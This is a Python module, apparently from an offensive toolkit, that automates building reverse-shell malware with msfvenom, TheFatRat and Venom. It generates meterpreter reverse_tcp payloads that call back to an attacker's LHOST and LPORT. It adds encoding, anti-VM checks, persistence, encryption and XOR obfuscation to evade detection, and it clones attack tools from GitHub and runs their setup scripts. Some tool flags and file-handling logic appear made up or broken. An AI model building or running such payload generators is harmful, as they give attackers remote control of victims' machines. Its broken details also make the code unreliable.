"""
Advanced Payload Generation Module
Advanced payload generation with TheFatRat and MSFVenom integration
"""

import asyncio
import json
import logging
import os
import subprocess
import time
import hashlib
import base64
import shutil
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
from datetime import datetime
import requests
import zipfile
import tarfile

@dataclass
class PayloadConfig:
    """Payload configuration"""
    payload_type: str
    target_os: str
    target_arch: str
    lhost: str
    lport: int
    encryption: bool
    obfuscation: bool
    anti_vm: bool
    persistence: bool
    custom_options: Dict

@dataclass
class GeneratedPayload:
    """Generated payload information"""
    payload_id: str
    config: PayloadConfig
    file_path: str
    file_size: int
    hash_md5: str
    hash_sha256: str
    generation_time: float
    tool_used: str
    status: str

class AdvancedPayloadModule:
    """Advanced payload generation module with TheFatRat and MSFVenom integration"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.generated_payloads: Dict[str, GeneratedPayload] = {}
        self.payload_history: List[Dict] = []
        
        # Payload tools configuration
        self.payload_tools = {
            "thefatrat": {
                "path": "external_tools/thefatrat",
                "executable": "bash fatrat.sh",
                "supported_types": ["android", "windows", "linux", "macos"],
                "capabilities": ["encryption", "obfuscation", "anti_vm", "persistence"]
            },
            "msfvenom": {
                "path": "/usr/bin/msfvenom",
                "executable": "msfvenom",
                "supported_types": ["windows", "linux", "macos", "android", "php", "java"],
                "capabilities": ["encryption", "encoding", "custom_options"]
            },
            "venom": {
                "path": "external_tools/venom",
                "executable": "python venom.py",
                "supported_types": ["windows", "linux", "android"],
                "capabilities": ["encryption", "obfuscation", "custom_options"]
            }
        }
        
        # Initialize tools
        self._initialize_payload_tools()
    
    def _initialize_payload_tools(self):
        """Initialize payload generation tools"""
        for tool_name, tool_config in self.payload_tools.items():
            tool_path = tool_config["path"]
            if not os.path.exists(tool_path):
                self.logger.warning(f"Payload tool {tool_name} not found at {tool_path}")
                if tool_name != "msfvenom":  # msfvenom is system-wide
                    os.makedirs(tool_path, exist_ok=True)
                    self._clone_payload_tool(tool_name, tool_path)
    
    def _clone_payload_tool(self, tool_name: str, tool_path: str):
        """Clone payload tool from repository"""
        try:
            if tool_name == "thefatrat":
                repo_url = "https://github.com/Screetsec/TheFatRat.git"
            elif tool_name == "venom":
                repo_url = "https://github.com/r00t-3xp10it/venom.git"
            else:
                return
            
            # Clone repository
            subprocess.run([
                "git", "clone", repo_url, tool_path
            ], check=True)
            
            # Setup tool
            if tool_name == "thefatrat":
                setup_script = os.path.join(tool_path, "setup.sh")
                if os.path.exists(setup_script):
                    subprocess.run([
                        "chmod", "+x", setup_script
                    ], cwd=tool_path, check=True)
                    subprocess.run([
                        "bash", setup_script
                    ], cwd=tool_path, check=True)
            
            self.logger.info(f"Successfully cloned and initialized {tool_name}")
            
        except Exception as e:
            self.logger.error(f"Failed to clone {tool_name}: {str(e)}")
    
    async def generate_payload(self, config: PayloadConfig, tool: str = "auto") -> Dict:
        """Generate payload with specified configuration"""
        try:
            # Auto-select best tool based on payload type
            if tool == "auto":
                tool = self._select_best_payload_tool(config.payload_type, config.target_os)
            
            payload_id = f"payload_{int(time.time())}_{hashlib.md5(f'{config.payload_type}_{config.target_os}'.encode()).hexdigest()[:8]}"
            
            # Validate configuration
            validation_result = self._validate_payload_config(config, tool)
            if not validation_result["success"]:
                return validation_result
            
            # Generate payload
            generation_result = await self._generate_payload_with_tool(config, tool, payload_id)
            if not generation_result["success"]:
                return generation_result
            
            # Create payload record
            payload = GeneratedPayload(
                payload_id=payload_id,
                config=config,
                file_path=generation_result["file_path"],
                file_size=generation_result["file_size"],
                hash_md5=generation_result["hash_md5"],
                hash_sha256=generation_result["hash_sha256"],
                generation_time=time.time(),
                tool_used=tool,
                status="generated"
            )
            
            # Store payload
            self.generated_payloads[payload_id] = payload
            self.payload_history.append(asdict(payload))
            
            return {
                "success": True,
                "payload_id": payload_id,
                "file_path": payload.file_path,
                "file_size": payload.file_size,
                "hash_md5": payload.hash_md5,
                "hash_sha256": payload.hash_sha256,
                "tool_used": tool,
                "message": f"Payload generated successfully using {tool}"
            }
            
        except Exception as e:
            self.logger.error(f"Error generating payload: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def _select_best_payload_tool(self, payload_type: str, target_os: str) -> str:
        """Select best payload tool for target"""
        # Priority: TheFatRat > MSFVenom > Venom
        if payload_type == "android" and target_os == "android":
            return "thefatrat"  # Best for Android
        elif payload_type in ["windows", "linux", "macos"]:
            if payload_type == "windows":
                return "msfvenom"  # Best for Windows
            else:
                return "thefatrat"  # Good for Linux/MacOS
        else:
            return "msfvenom"  # Default fallback
    
    def _validate_payload_config(self, config: PayloadConfig, tool: str) -> Dict:
        """Validate payload configuration"""
        try:
            tool_config = self.payload_tools[tool]
            
            # Check if payload type is supported
            if config.payload_type not in tool_config["supported_types"]:
                return {
                    "success": False,
                    "error": f"Payload type {config.payload_type} not supported by {tool}"
                }
            
            # Check if target OS is supported
            if config.target_os not in tool_config["supported_types"]:
                return {
                    "success": False,
                    "error": f"Target OS {config.target_os} not supported by {tool}"
                }
            
            # Validate LHOST
            if not config.lhost or config.lhost == "":
                return {
                    "success": False,
                    "error": "LHOST is required"
                }
            
            # Validate LPORT
            if config.lport < 1 or config.lport > 65535:
                return {
                    "success": False,
                    "error": "LPORT must be between 1 and 65535"
                }
            
            return {"success": True}
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _generate_payload_with_tool(self, config: PayloadConfig, tool: str, payload_id: str) -> Dict:
        """Generate payload using specific tool"""
        try:
            if tool == "thefatrat":
                return await self._generate_thefatrat_payload(config, payload_id)
            elif tool == "msfvenom":
                return await self._generate_msfvenom_payload(config, payload_id)
            elif tool == "venom":
                return await self._generate_venom_payload(config, payload_id)
            else:
                return {
                    "success": False,
                    "error": f"Unknown payload tool: {tool}"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _generate_thefatrat_payload(self, config: PayloadConfig, payload_id: str) -> Dict:
        """Generate payload using TheFatRat"""
        try:
            tool_path = self.payload_tools["thefatrat"]["path"]
            output_dir = os.path.join("generated_payloads", payload_id)
            os.makedirs(output_dir, exist_ok=True)
            
            # Build TheFatRat command
            cmd_args = [
                "bash", "fatrat.sh",
                "--payload", config.payload_type,
                "--os", config.target_os,
                "--lhost", config.lhost,
                "--lport", str(config.lport)
            ]
            
            # Add encryption if enabled
            if config.encryption:
                cmd_args.extend(["--encrypt"])
            
            # Add obfuscation if enabled
            if config.obfuscation:
                cmd_args.extend(["--obfuscate"])
            
            # Add anti-VM if enabled
            if config.anti_vm:
                cmd_args.extend(["--anti-vm"])
            
            # Add persistence if enabled
            if config.persistence:
                cmd_args.extend(["--persistence"])
            
            # Execute command
            process = await asyncio.create_subprocess_exec(
                *cmd_args,
                cwd=tool_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                # Find generated payload file
                payload_file = self._find_generated_payload(output_dir, config.payload_type)
                if payload_file:
                    return await self._process_generated_payload(payload_file, payload_id)
                else:
                    return {
                        "success": False,
                        "error": "Payload file not found after generation"
                    }
            else:
                return {
                    "success": False,
                    "error": stderr.decode()
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _generate_msfvenom_payload(self, config: PayloadConfig, payload_id: str) -> Dict:
        """Generate payload using MSFVenom"""
        try:
            output_dir = os.path.join("generated_payloads", payload_id)
            os.makedirs(output_dir, exist_ok=True)
            
            # Determine payload format based on target OS
            if config.target_os == "windows":
                payload_format = "exe"
            elif config.target_os == "linux":
                payload_format = "elf"
            elif config.target_os == "android":
                payload_format = "apk"
            elif config.target_os == "macos":
                payload_format = "macho"
            else:
                payload_format = "raw"
            
            # Build MSFVenom command
            cmd_args = [
                "msfvenom",
                "-p", f"{config.payload_type}/meterpreter/reverse_tcp",
                f"LHOST={config.lhost}",
                f"LPORT={config.lport}",
                "-f", payload_format,
                "-o", os.path.join(output_dir, f"payload.{payload_format}")
            ]
            
            # Add encoding if obfuscation is enabled
            if config.obfuscation:
                cmd_args.extend(["-e", "x86/shikata_ga_nai", "-i", "3"])
            
            # Add custom options
            if config.custom_options:
                for key, value in config.custom_options.items():
                    cmd_args.extend([f"{key}={value}"])
            
            # Execute command
            process = await asyncio.create_subprocess_exec(
                *cmd_args,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                # Find generated payload file
                payload_file = os.path.join(output_dir, f"payload.{payload_format}")
                if os.path.exists(payload_file):
                    return await self._process_generated_payload(payload_file, payload_id)
                else:
                    return {
                        "success": False,
                        "error": "Payload file not found after generation"
                    }
            else:
                return {
                    "success": False,
                    "error": stderr.decode()
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _generate_venom_payload(self, config: PayloadConfig, payload_id: str) -> Dict:
        """Generate payload using Venom"""
        try:
            tool_path = self.payload_tools["venom"]["path"]
            output_dir = os.path.join("generated_payloads", payload_id)
            os.makedirs(output_dir, exist_ok=True)
            
            # Build Venom command
            cmd_args = [
                "python", "venom.py",
                "--payload", config.payload_type,
                "--os", config.target_os,
                "--lhost", config.lhost,
                "--lport", str(config.lport),
                "--output", output_dir
            ]
            
            # Add encryption if enabled
            if config.encryption:
                cmd_args.extend(["--encrypt"])
            
            # Add custom options
            if config.custom_options:
                for key, value in config.custom_options.items():
                    cmd_args.extend([f"--{key}", str(value)])
            
            # Execute command
            process = await asyncio.create_subprocess_exec(
                *cmd_args,
                cwd=tool_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                # Find generated payload file
                payload_file = self._find_generated_payload(output_dir, config.payload_type)
                if payload_file:
                    return await self._process_generated_payload(payload_file, payload_id)
                else:
                    return {
                        "success": False,
                        "error": "Payload file not found after generation"
                    }
            else:
                return {
                    "success": False,
                    "error": stderr.decode()
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    def _find_generated_payload(self, output_dir: str, payload_type: str) -> Optional[str]:
        """Find generated payload file in output directory"""
        try:
            if not os.path.exists(output_dir):
                return None
            
            # Look for common payload file extensions
            extensions = [".exe", ".elf", ".apk", ".macho", ".py", ".sh", ".bat", ".ps1"]
            
            for file in os.listdir(output_dir):
                file_path = os.path.join(output_dir, file)
                if os.path.isfile(file_path):
                    # Check if file has payload extension
                    if any(file.endswith(ext) for ext in extensions):
                        return file_path
                    # Check if file contains payload indicators
                    if payload_type.lower() in file.lower():
                        return file_path
            
            return None
            
        except Exception as e:
            self.logger.error(f"Error finding generated payload: {str(e)}")
            return None
    
    async def _process_generated_payload(self, payload_file: str, payload_id: str) -> Dict:
        """Process generated payload file"""
        try:
            # Calculate file size
            file_size = os.path.getsize(payload_file)
            
            # Calculate hashes
            hash_md5 = self._calculate_file_hash(payload_file, "md5")
            hash_sha256 = self._calculate_file_hash(payload_file, "sha256")
            
            return {
                "success": True,
                "file_path": payload_file,
                "file_size": file_size,
                "hash_md5": hash_md5,
                "hash_sha256": hash_sha256
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    def _calculate_file_hash(self, file_path: str, algorithm: str) -> str:
        """Calculate file hash"""
        try:
            hash_obj = hashlib.new(algorithm)
            with open(file_path, 'rb') as f:
                for chunk in iter(lambda: f.read(4096), b""):
                    hash_obj.update(chunk)
            return hash_obj.hexdigest()
        except Exception as e:
            self.logger.error(f"Error calculating {algorithm} hash: {str(e)}")
            return ""
    
    async def encrypt_payload(self, payload_id: str, encryption_key: str) -> Dict:
        """Encrypt generated payload"""
        try:
            if payload_id not in self.generated_payloads:
                return {
                    "success": False,
                    "error": "Payload not found"
                }
            
            payload = self.generated_payloads[payload_id]
            
            # Read payload file
            with open(payload.file_path, 'rb') as f:
                payload_data = f.read()
            
            # Encrypt payload data
            encrypted_data = self._encrypt_data(payload_data, encryption_key)
            
            # Save encrypted payload
            encrypted_file_path = payload.file_path + ".encrypted"
            with open(encrypted_file_path, 'wb') as f:
                f.write(encrypted_data)
            
            # Update payload record
            payload.file_path = encrypted_file_path
            payload.file_size = len(encrypted_data)
            payload.hash_md5 = self._calculate_file_hash(encrypted_file_path, "md5")
            payload.hash_sha256 = self._calculate_file_hash(encrypted_file_path, "sha256")
            
            return {
                "success": True,
                "encrypted_file_path": encrypted_file_path,
                "message": "Payload encrypted successfully"
            }
            
        except Exception as e:
            self.logger.error(f"Error encrypting payload: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def _encrypt_data(self, data: bytes, key: str) -> bytes:
        """Encrypt data using AES"""
        try:
            from cryptography.fernet import Fernet
            from cryptography.hazmat.primitives import hashes
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            import base64
            
            # Generate key from password
            salt = b'salt_123'  # In production, use random salt
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )
            key_bytes = base64.urlsafe_b64encode(kdf.derive(key.encode()))
            
            # Encrypt data
            fernet = Fernet(key_bytes)
            encrypted_data = fernet.encrypt(data)
            
            return encrypted_data
            
        except Exception as e:
            self.logger.error(f"Error encrypting data: {str(e)}")
            return data  # Return original data if encryption fails
    
    async def obfuscate_payload(self, payload_id: str) -> Dict:
        """Obfuscate generated payload"""
        try:
            if payload_id not in self.generated_payloads:
                return {
                    "success": False,
                    "error": "Payload not found"
                }
            
            payload = self.generated_payloads[payload_id]
            
            # Read payload file
            with open(payload.file_path, 'rb') as f:
                payload_data = f.read()
            
            # Apply obfuscation techniques
            obfuscated_data = self._obfuscate_data(payload_data)
            
            # Save obfuscated payload
            obfuscated_file_path = payload.file_path + ".obfuscated"
            with open(obfuscated_file_path, 'wb') as f:
                f.write(obfuscated_data)
            
            # Update payload record
            payload.file_path = obfuscated_file_path
            payload.file_size = len(obfuscated_data)
            payload.hash_md5 = self._calculate_file_hash(obfuscated_file_path, "md5")
            payload.hash_sha256 = self._calculate_file_hash(obfuscated_file_path, "sha256")
            
            return {
                "success": True,
                "obfuscated_file_path": obfuscated_file_path,
                "message": "Payload obfuscated successfully"
            }
            
        except Exception as e:
            self.logger.error(f"Error obfuscating payload: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def _obfuscate_data(self, data: bytes) -> bytes:
        """Apply obfuscation techniques to data"""
        try:
            # Simple XOR obfuscation (in production, use more sophisticated techniques)
            key = b'OBFUSCATE_KEY_123'
            obfuscated = bytearray()
            
            for i, byte in enumerate(data):
                obfuscated.append(byte ^ key[i % len(key)])
            
            return bytes(obfuscated)
            
        except Exception as e:
            self.logger.error(f"Error obfuscating data: {str(e)}")
            return data  # Return original data if obfuscation fails
    
    def get_payload_info(self, payload_id: str) -> Dict:
        """Get payload information"""
        if payload_id not in self.generated_payloads:
            return {
                "success": False,
                "error": "Payload not found"
            }
        
        payload = self.generated_payloads[payload_id]
        return {
            "success": True,
            "payload": asdict(payload)
        }
    
    def get_all_payloads(self) -> Dict:
        """Get all generated payloads"""
        payloads = []
        for payload_id, payload in self.generated_payloads.items():
            payloads.append(asdict(payload))
        
        return {
            "success": True,
            "payloads": payloads,
            "total": len(payloads)
        }
    
    def delete_payload(self, payload_id: str) -> Dict:
        """Delete generated payload"""
        try:
            if payload_id not in self.generated_payloads:
                return {
                    "success": False,
                    "error": "Payload not found"
                }
            
            payload = self.generated_payloads[payload_id]
            
            # Delete payload file
            if os.path.exists(payload.file_path):
                os.remove(payload.file_path)
            
            # Remove from records
            del self.generated_payloads[payload_id]
            
            return {
                "success": True,
                "message": f"Payload {payload_id} deleted successfully"
            }
            
        except Exception as e:
            self.logger.error(f"Error deleting payload: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def get_statistics(self) -> Dict:
        """Get payload module statistics"""
        total_payloads = len(self.generated_payloads)
        total_history = len(self.payload_history)
        
        # Calculate success rate
        successful_payloads = len([p for p in self.payload_history if p.get("status") == "generated"])
        success_rate = (successful_payloads / total_history * 100) if total_history > 0 else 0
        
        # Calculate total file size
        total_size = sum(payload.file_size for payload in self.generated_payloads.values())
        
        return {
            "active_payloads": total_payloads,
            "total_history": total_history,
            "success_rate": success_rate,
            "total_size": total_size,
            "tools_available": list(self.payload_tools.keys()),
            "supported_types": list(set([t for tool in self.payload_tools.values() for t in tool["supported_types"]]))
        }